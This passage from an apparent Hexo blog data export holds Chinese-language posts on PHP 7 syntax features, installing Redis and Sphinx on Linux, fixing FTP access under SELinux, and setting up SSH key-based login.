id=\"示例：限定返回array类型\"><a href=\"#示例：限定返回array类型\" class=\"headerlink\" title=\"示例：限定返回array类型\"></a>示例：限定返回array类型</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(): array &#123;</span><br><span class=\"line\">    return [];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/return_types\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/return_types</a></p>\n</blockquote>\n<h3 id=\"Scalar-Type-Declarations\"><a href=\"#Scalar-Type-Declarations\" class=\"headerlink\" title=\"Scalar Type Declarations\"></a>Scalar Type Declarations</h3><h3 id=\"标量类型声明\"><a href=\"#标量类型声明\" class=\"headerlink\" title=\"标量类型声明\"></a>标量类型声明</h3><p>参数或返回值只要是标量<code>string, int, float, boolean</code>，也可以像上面一样限定为单一类型．而当前PHP5只可以限定<code>array</code>和<code>object</code>类型的参数了．</p>\n<h4 id=\"示例用法：限制参数为int类型\"><a href=\"#示例用法：限制参数为int类型\" class=\"headerlink\" title=\"示例用法：限制参数为int类型\"></a>示例用法：限制参数为int类型</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function add(int $a, int $b): string &#123;</span><br><span class=\"line\">    return $a . $b;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>标量声明的主要作用是自动实现参数的强制类型转换．不然很多时候我们要在代码里写很多 (int) (bool)</p>\n<h4 id=\"自动转换示例\"><a href=\"#自动转换示例\" class=\"headerlink\" title=\"自动转换示例\"></a>自动转换示例</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump(add(1, &quot;2a&quot;)); // string(&quot;12&quot;)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/scalar_type_hints_v5\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/scalar_type_hints_v5</a></p>\n</blockquote>\n<h3 id=\"Null-Coalesce-Operator\"><a href=\"#Null-Coalesce-Operator\" class=\"headerlink\" title=\"Null Coalesce Operator\"></a>Null Coalesce Operator</h3><h3 id=\"空值运算符\"><a href=\"#空值运算符\" class=\"headerlink\" title=\"空值运算符\"></a>空值运算符</h3><p>这是专门判断空值的操作符，示例代码：<br>获取GET参数user，如果参数不存在，则默认值是nobody</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = $_GET[&apos;user&apos;] ?? &apos;nobody&apos;;</span><br></pre></td></tr></table></figure>\n<p>上面的代码等同于PHP5的:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = isset($_GET[&apos;user&apos;]) ? $_GET[&apos;user&apos;] : &apos;nobody&apos;;</span><br></pre></td></tr></table></figure>\n<p>以后判断请求参数取默认值就方便多了</p>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/isset_ternary\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/isset_ternary</a></p>\n</blockquote>\n<h3 id=\"Combined-comparison-Operator-lt-gt\"><a href=\"#Combined-comparison-Operator-lt-gt\" class=\"headerlink\" title=\"Combined comparison Operator (&lt;=&gt;)\"></a>Combined comparison Operator (&lt;=&gt;)</h3><h3 id=\"合并比较运算符\"><a href=\"#合并比较运算符\" class=\"headerlink\" title=\"合并比较运算符\"></a>合并比较运算符</h3><p>以前我们比较大小经常用这种写法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = 1;</span><br><span class=\"line\">$b = 2;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($a &gt; $b) &#123;</span><br><span class=\"line\">    echo 1;</span><br><span class=\"line\">&#125; elseif ($a == $b) &#123;</span><br><span class=\"line\">    echo 0;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    echo -1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>新的 <strong>&lt;=&gt;</strong> 运算符也是起到这个作用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 1 &lt;=&gt; 1; // 0</span><br><span class=\"line\">echo 1 &lt;=&gt; 2; // -1</span><br><span class=\"line\">echo 2 &lt;=&gt; 1; // 1</span><br></pre></td></tr></table></figure>\n<p>现在它可以简化上面一串if else的写法了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch ($a  &lt;=&gt; $b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    case 1:</span><br><span class=\"line\">    break;</span><br><span class=\"line\">    case 0:</span><br><span class=\"line\">    break;</span><br><span class=\"line\">    case -1:</span><br><span class=\"line\">    break;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样是不是更清爽．上面的只是示例，也可以按需求用其它逻辑实现</p>\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/combined-comparison-operator\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/combined-comparison-operator</a></p>\n</blockquote>\n<h3 id=\"Anonymous-Classes\"><a href=\"#Anonymous-Classes\" class=\"headerlink\" title=\"Anonymous Classes\"></a>Anonymous Classes</h3><h3 id=\"匿名类\"><a href=\"#匿名类\" class=\"headerlink\" title=\"匿名类\"></a>匿名类</h3><p>不需要给类命名，这和匿名函数类似</p>\n<p>示例代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/* implementing an anonymous console object from your framework maybe */</span><br><span class=\"line\">(new class extends ConsoleProgram &#123;</span><br><span class=\"line\">    public function main() &#123;</span><br><span class=\"line\">       /* ... */</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)-&gt;main();</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/anonymous_classes\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/anonymous_classes</a></p>\n</blockquote>\n<p>&nbsp;</p>\n"},{"title":"redis安装笔记","id":"75","date":"2015-06-09T17:22:49.000Z","_content":"\n## 安装\n\n安装前约定以 **/srv/server/redis** 来放置编译后的可执行文件\n\n下载解压最新版开发包，因为本身是开发用的，所以装个**unstable**玩玩\n```\n$ wget https://github.com/antirez/redis/archive/unstable.tar.gz\n$ tar -zxf unstable.tar.gz\n$ cp -R redis-unstable /srv/server/redis\n\n```\nredis本身小巧，不需要特别的依赖关系，所以省去了**./configure**这一步，在哪**make**就安装在哪\n```\n$ cd /srv/server/redis\n$ sudo make\n$ sudo make install\n```\n一般都不会遇到错误，因为它没有过多的依赖问题\n\n安装完成，在**./src**目录下就有编译好的可执行文件．另外安装程序还会在**/usr/local/bin**也放置一份可执行文件，因而可以直接运行 **$ redis-cli**\n\n## 优化点\n\n将redis-server作为init.d/service管理会方便很多，而redis也自带了启动脚本\n\n### 首先复制文件到预定位置\n\n```\n$ sudo cp ./utils/redis_init_script /etc/init.d/redis\n$ sudo mkdir /etc/redis\n$ sudo cp ./redis.conf /etc/redis/6379.conf\n```\n\n### 在后台运行\n\nredis默认在当前进程直接运行，因此每回启动都需要用nohup，比较繁琐．可以改下它的配置文件解决\n```\n$ sudo vi /etc/redis/6379.conf\n- daemonize no\n+ daemonize yes\n```\n\n### 启动控制\n\nredis的启动脚本和配置文件定义的pid位置还有差别\n```\n$ sudo vi /etc/redis/6379.conf\n- pidfile /var/run/redis.pid\n+ pidfile /var/run/redis_6379.pid\n$ sudo service redis start\nStarting Redis server...\n$ sudo service redis stop\nStopping ...\nRedis stopped\n```\n\n### 开机启动\n\nredis的启动文件不支持**chkconfig**配置，需要在开头加两行启动配置\n\n    <span class=\"com\">$ sudo vi /etc/init.d/redis\n    <<<++\n    # chkconfig: 2345 90 60\n    # description start redis server on boot\n    >>>\n    $ sudo chkconfig redis on</span>\n\n大功告成\n\n## 后续\n\nredis从各方面都比memcached强，尤其是在面对复杂业务时，完爆memcached\n\n后面会再写些笔记，记录redis的使用经验","source":"_posts/redis-e5-ae-89-e8-a3-85-e7-ac-94-e8-ae-b0.md","raw":"---\ntitle: redis安装笔记\nid: 75\ncategories:\n  - linux\ndate: 2015-06-10 01:22:49\ntags:\n---\n\n## 安装\n\n安装前约定以 **/srv/server/redis** 来放置编译后的可执行文件\n\n下载解压最新版开发包，因为本身是开发用的，所以装个**unstable**玩玩\n```\n$ wget https://github.com/antirez/redis/archive/unstable.tar.gz\n$ tar -zxf unstable.tar.gz\n$ cp -R redis-unstable /srv/server/redis\n\n```\nredis本身小巧，不需要特别的依赖关系，所以省去了**./configure**这一步，在哪**make**就安装在哪\n```\n$ cd /srv/server/redis\n$ sudo make\n$ sudo make install\n```\n一般都不会遇到错误，因为它没有过多的依赖问题\n\n安装完成，在**./src**目录下就有编译好的可执行文件．另外安装程序还会在**/usr/local/bin**也放置一份可执行文件，因而可以直接运行 **$ redis-cli**\n\n## 优化点\n\n将redis-server作为init.d/service管理会方便很多，而redis也自带了启动脚本\n\n### 首先复制文件到预定位置\n\n```\n$ sudo cp ./utils/redis_init_script /etc/init.d/redis\n$ sudo mkdir /etc/redis\n$ sudo cp ./redis.conf /etc/redis/6379.conf\n```\n\n### 在后台运行\n\nredis默认在当前进程直接运行，因此每回启动都需要用nohup，比较繁琐．可以改下它的配置文件解决\n```\n$ sudo vi /etc/redis/6379.conf\n- daemonize no\n+ daemonize yes\n```\n\n### 启动控制\n\nredis的启动脚本和配置文件定义的pid位置还有差别\n```\n$ sudo vi /etc/redis/6379.conf\n- pidfile /var/run/redis.pid\n+ pidfile /var/run/redis_6379.pid\n$ sudo service redis start\nStarting Redis server...\n$ sudo service redis stop\nStopping ...\nRedis stopped\n```\n\n### 开机启动\n\nredis的启动文件不支持**chkconfig**配置，需要在开头加两行启动配置\n\n    <span class=\"com\">$ sudo vi /etc/init.d/redis\n    <<<++\n    # chkconfig: 2345 90 60\n    # description start redis server on boot\n    >>>\n    $ sudo chkconfig redis on</span>\n\n大功告成\n\n## 后续\n\nredis从各方面都比memcached强，尤其是在面对复杂业务时，完爆memcached\n\n后面会再写些笔记，记录redis的使用经验","slug":"redis-e5-ae-89-e8-a3-85-e7-ac-94-e8-ae-b0","published":1,"updated":"2018-03-05T12:57:51.549Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwp002plzlm1xtv2vzu","content":"<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>安装前约定以 <strong>/srv/server/redis</strong> 来放置编译后的可执行文件</p>\n<p>下载解压最新版开发包，因为本身是开发用的，所以装个<strong>unstable</strong>玩玩<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wget https://github.com/antirez/redis/archive/unstable.tar.gz</span><br><span class=\"line\">$ tar -zxf unstable.tar.gz</span><br><span class=\"line\">$ cp -R redis-unstable /srv/server/redis</span><br></pre></td></tr></table></figure></p>\n<p>redis本身小巧，不需要特别的依赖关系，所以省去了<strong>./configure</strong>这一步，在哪<strong>make</strong>就安装在哪<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd /srv/server/redis</span><br><span class=\"line\">$ sudo make</span><br><span class=\"line\">$ sudo make install</span><br></pre></td></tr></table></figure></p>\n<p>一般都不会遇到错误，因为它没有过多的依赖问题</p>\n<p>安装完成，在<strong>./src</strong>目录下就有编译好的可执行文件．另外安装程序还会在<strong>/usr/local/bin</strong>也放置一份可执行文件，因而可以直接运行 <strong>$ redis-cli</strong></p>\n<h2 id=\"优化点\"><a href=\"#优化点\" class=\"headerlink\" title=\"优化点\"></a>优化点</h2><p>将redis-server作为init.d/service管理会方便很多，而redis也自带了启动脚本</p>\n<h3 id=\"首先复制文件到预定位置\"><a href=\"#首先复制文件到预定位置\" class=\"headerlink\" title=\"首先复制文件到预定位置\"></a>首先复制文件到预定位置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo cp ./utils/redis_init_script /etc/init.d/redis</span><br><span class=\"line\">$ sudo mkdir /etc/redis</span><br><span class=\"line\">$ sudo cp ./redis.conf /etc/redis/6379.conf</span><br></pre></td></tr></table></figure>\n<h3 id=\"在后台运行\"><a href=\"#在后台运行\" class=\"headerlink\" title=\"在后台运行\"></a>在后台运行</h3><p>redis默认在当前进程直接运行，因此每回启动都需要用nohup，比较繁琐．可以改下它的配置文件解决<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo vi /etc/redis/6379.conf</span><br><span class=\"line\">- daemonize no</span><br><span class=\"line\">+ daemonize yes</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"启动控制\"><a href=\"#启动控制\" class=\"headerlink\" title=\"启动控制\"></a>启动控制</h3><p>redis的启动脚本和配置文件定义的pid位置还有差别<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo vi /etc/redis/6379.conf</span><br><span class=\"line\">- pidfile /var/run/redis.pid</span><br><span class=\"line\">+ pidfile /var/run/redis_6379.pid</span><br><span class=\"line\">$ sudo service redis start</span><br><span class=\"line\">Starting Redis server...</span><br><span class=\"line\">$ sudo service redis stop</span><br><span class=\"line\">Stopping ...</span><br><span class=\"line\">Redis stopped</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"开机启动\"><a href=\"#开机启动\" class=\"headerlink\" title=\"开机启动\"></a>开机启动</h3><p>redis的启动文件不支持<strong>chkconfig</strong>配置，需要在开头加两行启动配置</p>\n<pre><code>&lt;span class=&quot;com&quot;&gt;$ sudo vi /etc/init.d/redis\n&lt;&lt;&lt;++\n# chkconfig: 2345 90 60\n# description start redis server on boot\n&gt;&gt;&gt;\n$ sudo chkconfig redis on&lt;/span&gt;\n</code></pre><p>大功告成</p>\n<h2 id=\"后续\"><a href=\"#后续\" class=\"headerlink\" title=\"后续\"></a>后续</h2><p>redis从各方面都比memcached强，尤其是在面对复杂业务时，完爆memcached</p>\n<p>后面会再写些笔记，记录redis的使用经验</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>安装前约定以 <strong>/srv/server/redis</strong> 来放置编译后的可执行文件</p>\n<p>下载解压最新版开发包，因为本身是开发用的，所以装个<strong>unstable</strong>玩玩<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wget https://github.com/antirez/redis/archive/unstable.tar.gz</span><br><span class=\"line\">$ tar -zxf unstable.tar.gz</span><br><span class=\"line\">$ cp -R redis-unstable /srv/server/redis</span><br></pre></td></tr></table></figure></p>\n<p>redis本身小巧，不需要特别的依赖关系，所以省去了<strong>./configure</strong>这一步，在哪<strong>make</strong>就安装在哪<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd /srv/server/redis</span><br><span class=\"line\">$ sudo make</span><br><span class=\"line\">$ sudo make install</span><br></pre></td></tr></table></figure></p>\n<p>一般都不会遇到错误，因为它没有过多的依赖问题</p>\n<p>安装完成，在<strong>./src</strong>目录下就有编译好的可执行文件．另外安装程序还会在<strong>/usr/local/bin</strong>也放置一份可执行文件，因而可以直接运行 <strong>$ redis-cli</strong></p>\n<h2 id=\"优化点\"><a href=\"#优化点\" class=\"headerlink\" title=\"优化点\"></a>优化点</h2><p>将redis-server作为init.d/service管理会方便很多，而redis也自带了启动脚本</p>\n<h3 id=\"首先复制文件到预定位置\"><a href=\"#首先复制文件到预定位置\" class=\"headerlink\" title=\"首先复制文件到预定位置\"></a>首先复制文件到预定位置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo cp ./utils/redis_init_script /etc/init.d/redis</span><br><span class=\"line\">$ sudo mkdir /etc/redis</span><br><span class=\"line\">$ sudo cp ./redis.conf /etc/redis/6379.conf</span><br></pre></td></tr></table></figure>\n<h3 id=\"在后台运行\"><a href=\"#在后台运行\" class=\"headerlink\" title=\"在后台运行\"></a>在后台运行</h3><p>redis默认在当前进程直接运行，因此每回启动都需要用nohup，比较繁琐．可以改下它的配置文件解决<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo vi /etc/redis/6379.conf</span><br><span class=\"line\">- daemonize no</span><br><span class=\"line\">+ daemonize yes</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"启动控制\"><a href=\"#启动控制\" class=\"headerlink\" title=\"启动控制\"></a>启动控制</h3><p>redis的启动脚本和配置文件定义的pid位置还有差别<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo vi /etc/redis/6379.conf</span><br><span class=\"line\">- pidfile /var/run/redis.pid</span><br><span class=\"line\">+ pidfile /var/run/redis_6379.pid</span><br><span class=\"line\">$ sudo service redis start</span><br><span class=\"line\">Starting Redis server...</span><br><span class=\"line\">$ sudo service redis stop</span><br><span class=\"line\">Stopping ...</span><br><span class=\"line\">Redis stopped</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"开机启动\"><a href=\"#开机启动\" class=\"headerlink\" title=\"开机启动\"></a>开机启动</h3><p>redis的启动文件不支持<strong>chkconfig</strong>配置，需要在开头加两行启动配置</p>\n<pre><code>&lt;span class=&quot;com&quot;&gt;$ sudo vi /etc/init.d/redis\n&lt;&lt;&lt;++\n# chkconfig: 2345 90 60\n# description start redis server on boot\n&gt;&gt;&gt;\n$ sudo chkconfig redis on&lt;/span&gt;\n</code></pre><p>大功告成</p>\n<h2 id=\"后续\"><a href=\"#后续\" class=\"headerlink\" title=\"后续\"></a>后续</h2><p>redis从各方面都比memcached强，尤其是在面对复杂业务时，完爆memcached</p>\n<p>后面会再写些笔记，记录redis的使用经验</p>\n"},{"title":"SELINUX下ftp权限修正","id":"103","date":"2015-06-20T06:02:58.000Z","_content":"\n在**SELINUX**模式下（redhat系列才有），ftp无法访问home目录，即便是自己的也不行．\n\nftp错误: 226 Transfer done (but failed to open directory).\n```\nftp> ls\n227 Entering Passive Mode (10,240,254,73,22,229).\n150 Here comes the directory listing.\n226 Transfer done (but failed to open directory).\n```\n有两种解决办法：\n\n### 1\\. 配置SELINUX允许访问home目录\n\n```\n# setsebool -P allow_ftpd_full_access on\n# setsebool -P ftp_home_dir on\n\n```\n\n### 2\\. 彻底关闭SELINUX，这个不太好\n\n```\n# vi /etc/selinux/config\n+ SELINUX=disabled\n# reboot\n\n```\n这个还需要重启机器","source":"_posts/selinux-e4-b8-8bftp-e6-9d-83-e9-99-90-e4-bf-ae-e6-ad-a3.md","raw":"---\ntitle: SELINUX下ftp权限修正\nid: 103\ncategories:\n  - linux\ndate: 2015-06-20 14:02:58\ntags:\n---\n\n在**SELINUX**模式下（redhat系列才有），ftp无法访问home目录，即便是自己的也不行．\n\nftp错误: 226 Transfer done (but failed to open directory).\n```\nftp> ls\n227 Entering Passive Mode (10,240,254,73,22,229).\n150 Here comes the directory listing.\n226 Transfer done (but failed to open directory).\n```\n有两种解决办法：\n\n### 1\\. 配置SELINUX允许访问home目录\n\n```\n# setsebool -P allow_ftpd_full_access on\n# setsebool -P ftp_home_dir on\n\n```\n\n### 2\\. 彻底关闭SELINUX，这个不太好\n\n```\n# vi /etc/selinux/config\n+ SELINUX=disabled\n# reboot\n\n```\n这个还需要重启机器","slug":"selinux-e4-b8-8bftp-e6-9d-83-e9-99-90-e4-bf-ae-e6-ad-a3","published":1,"updated":"2018-03-05T12:57:36.656Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhws002rlzlmwz4cavkg","content":"<p>在<strong>SELINUX</strong>模式下（redhat系列才有），ftp无法访问home目录，即便是自己的也不行．</p>\n<p>ftp错误: 226 Transfer done (but failed to open directory).<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">227 Entering Passive Mode (10,240,254,73,22,229).</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">226 Transfer done (but failed to open directory).</span><br></pre></td></tr></table></figure></p>\n<p>有两种解决办法：</p>\n<h3 id=\"1-配置SELINUX允许访问home目录\"><a href=\"#1-配置SELINUX允许访问home目录\" class=\"headerlink\" title=\"1. 配置SELINUX允许访问home目录\"></a>1. 配置SELINUX允许访问home目录</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># setsebool -P allow_ftpd_full_access on</span><br><span class=\"line\"># setsebool -P ftp_home_dir on</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-彻底关闭SELINUX，这个不太好\"><a href=\"#2-彻底关闭SELINUX，这个不太好\" class=\"headerlink\" title=\"2. 彻底关闭SELINUX，这个不太好\"></a>2. 彻底关闭SELINUX，这个不太好</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># vi /etc/selinux/config</span><br><span class=\"line\">+ SELINUX=disabled</span><br><span class=\"line\"># reboot</span><br></pre></td></tr></table></figure>\n<p>这个还需要重启机器</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在<strong>SELINUX</strong>模式下（redhat系列才有），ftp无法访问home目录，即便是自己的也不行．</p>\n<p>ftp错误: 226 Transfer done (but failed to open directory).<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">227 Entering Passive Mode (10,240,254,73,22,229).</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">226 Transfer done (but failed to open directory).</span><br></pre></td></tr></table></figure></p>\n<p>有两种解决办法：</p>\n<h3 id=\"1-配置SELINUX允许访问home目录\"><a href=\"#1-配置SELINUX允许访问home目录\" class=\"headerlink\" title=\"1. 配置SELINUX允许访问home目录\"></a>1. 配置SELINUX允许访问home目录</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># setsebool -P allow_ftpd_full_access on</span><br><span class=\"line\"># setsebool -P ftp_home_dir on</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-彻底关闭SELINUX，这个不太好\"><a href=\"#2-彻底关闭SELINUX，这个不太好\" class=\"headerlink\" title=\"2. 彻底关闭SELINUX，这个不太好\"></a>2. 彻底关闭SELINUX，这个不太好</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># vi /etc/selinux/config</span><br><span class=\"line\">+ SELINUX=disabled</span><br><span class=\"line\"># reboot</span><br></pre></td></tr></table></figure>\n<p>这个还需要重启机器</p>\n"},{"title":"sphinx 安装记录","id":"15","date":"2014-06-23T10:34:44.000Z","_content":"\n1\\. yum 安装\n```\n$ sudo yum install sphinx libsphinxclient libsphinxclient-devel\n```\n&nbsp;","source":"_posts/sphinx-e5-ae-89-e8-a3-85-e8-ae-b0-e5-bd-95.md","raw":"---\ntitle: sphinx 安装记录\nid: 15\ncategories:\n  - sphinx\ndate: 2014-06-23 18:34:44\ntags:\n---\n\n1\\. yum 安装\n```\n$ sudo yum install sphinx libsphinxclient libsphinxclient-devel\n```\n&nbsp;","slug":"sphinx-e5-ae-89-e8-a3-85-e8-ae-b0-e5-bd-95","published":1,"updated":"2018-03-05T12:56:25.366Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwu002tlzlmtjmn58f2","content":"<p>1. yum 安装<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install sphinx libsphinxclient libsphinxclient-devel</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>1. yum 安装<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install sphinx libsphinxclient libsphinxclient-devel</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n"},{"title":"SSH 免登陆 authorized_keys","id":"33","date":"2015-05-08T21:28:26.000Z","_content":"\n### authorized_keys\n\n这是通用的做法，将本地机器的 `id_rsa.pub` 公匙字符串拷贝下来，追加到服务器的 `~/.ssh/authorized_keys` 文件下，作为一行,并且保持其它人不可写的权限,就可以不用再输入密码．\n\n#### 客户端的配置\n\n##### linux\n\n创建客户端ssh key,回车选默认的即可\n创建程序会询问你的key存放位置,以及加密密码等,回车选则默认即可\n```\n$ ssh-keygen\n\n```\n打印认证公匙,复制然后开始下一步\n```\n$ cat ~/.ssh/id_rsa.pub\n\n```\n公匙 ~/.ssh/id_rsa.pub 是每次登录ssh时都会发送的,因而把其加入到服务器的 ~/.ssh/authorized_keys 后,服务器会据此判断是否可以免除密码认证过程\n\n&nbsp;\n\n#### 服务端的配置\n\n创建自动认证文件,如果没有的话\n```\n$ touch ~/.ssh/authorized_keys\n```\n设置该文件权限为其它人不可写,权限限制是必须的,否则将不会生效\n```\n$ chmod 644 ~/.ssh/authorized_keys\n```\n将在客户端拷贝的 ~/.ssh/id_rsa.pub 内容追加到认证文件,它只占一行\n```\n$ vi ~/.ssh/authorized_keys\n```","source":"_posts/ssh-e5-85-8d-e7-99-bb-e9-99-86-authorized-keys.md","raw":"---\ntitle: SSH 免登陆 authorized_keys\nid: 33\ncategories:\n  - linux\ndate: 2015-05-09 05:28:26\ntags:\n---\n\n### authorized_keys\n\n这是通用的做法，将本地机器的 `id_rsa.pub` 公匙字符串拷贝下来，追加到服务器的 `~/.ssh/authorized_keys` 文件下，作为一行,并且保持其它人不可写的权限,就可以不用再输入密码．\n\n#### 客户端的配置\n\n##### linux\n\n创建客户端ssh key,回车选默认的即可\n创建程序会询问你的key存放位置,以及加密密码等,回车选则默认即可\n```\n$ ssh-keygen\n\n```\n打印认证公匙,复制然后开始下一步\n```\n$ cat ~/.ssh/id_rsa.pub\n\n```\n公匙 ~/.ssh/id_rsa.pub 是每次登录ssh时都会发送的,因而把其加入到服务器的 ~/.ssh/authorized_keys 